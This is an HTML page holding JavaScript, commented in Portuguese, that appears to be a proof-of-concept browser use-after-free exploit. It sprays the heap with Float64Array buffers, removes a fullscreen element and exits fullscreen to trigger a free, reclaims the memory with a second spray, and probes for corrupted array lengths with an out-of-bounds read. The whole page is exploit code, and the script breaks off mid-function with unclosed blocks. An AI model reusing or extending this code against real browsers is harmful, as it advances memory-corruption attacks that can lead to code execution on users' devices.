<!DOCTYPE html>
<html>

<script>
function log(msg){
    document.getElementById("log").textContent += msg + "\n";
}

// Heap grooming inicial
function setupHeap() {
    let arr = [];
    for (let i = 0; i < 5000; i++) {
        let buf = new ArrayBuffer(0x40);
        let f64 = new Float64Array(buf);
        f64[0] = 13.37;
        arr.push(f64);
    }
    return arr;
}

// Fullscreen target (mantém seu bug original intacto)
function setupFS() {
    let d = document.createElement("div");
    d.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
    d.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
    document.body.appendChild(d);
    d.webkitRequestFullscreen();
    return d;
}

// Reclaim CONTROLADO (sem DOM pesado)
function controlledReclaim() {
    log("[*] Controlled reclaim iniciado");

    let spray = [];

    for (let i = 0; i < 20000; i++) {
        let buf = new ArrayBuffer(0x40);
        let f64 = new Float64Array(buf);

        // padrão identificável
        f64[0] = 1.111111;
        f64[1] = 2.222222;
        f64[2] = 3.333333;

        spray.push(f64);
    }

    log("[*] Reclaim finalizado: " + spray.length);
    return spray;
}

// DETECTOR de corrupção
function probeCorruption(arr) {
    log("---- PROBE ----");

    for (let i = 0; i < arr.length; i++) {
        try {
            let a = arr[i];

            // checagem estrutural
            if (a.length !== 8 || a.byteLength !== 64) {
                log("[!!!] POSSÍVEL CORRUPÇÃO");
                log("len=" + a.length + " byteLen=" + a.byteLength);

                // leitura fora de bounds
                log("OOB read: " + a[20]);

                return true;
            }

        } catch(e) {
            log("[EXCEPTION] " + e);
            return true;
        }
    }

    log("[OK] Sem corrupção detectada");
    return false;
}

function trigger(fsTarget, victims) {
    log("[*] Trigger");

    fsTarget.remove();
    document.webkitExitFullscreen();

    let spray = controlledReclaim();

    setTimeout(() => {
        probeCorruption(victims);
    }, 100);
}

function run() {
    log("Running... Press OPTIONS");

    let victims = setupHeap();
    let fs = setupFS();

    window.onblur = function() {
        log("[*] onblur");

        setTimeout(() => {
            trigger(fs, victims);
        }, 3000);

</script>
